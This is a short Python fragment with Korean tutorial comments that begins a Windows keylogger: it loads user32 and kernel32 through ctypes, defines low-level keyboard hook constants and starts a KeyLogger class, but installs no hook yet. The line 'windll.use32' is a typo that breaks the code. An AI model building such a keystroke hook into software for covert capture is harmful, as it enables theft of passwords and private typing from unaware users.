import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

#ctype란 뭘까요? 윈도우, 리눅스, 유닉스, OS X, 안드로이드 등 다양한 플랫폼을 지원하는 맥가이버 칼과 같은 도구!!

user32 = windll.use32
kernel32 = windll.kernel32
#windll을 사용해서 user32와 kernel32형 변수를 선언했습니다. 

WH_KEYBOARD_LL=13
WM_KEYDOWN=0X0100
CTRL_CODE =162
#변수 선언 Win32 API 내부에서 정의해서 사용하는 변숫값

class KeyLogger:
    def __init__(self):
        self.lUser32 = user32
        self.hooked = None
# 훅을 설정하고 해제하는 기능을 가진 클래스를 정의 

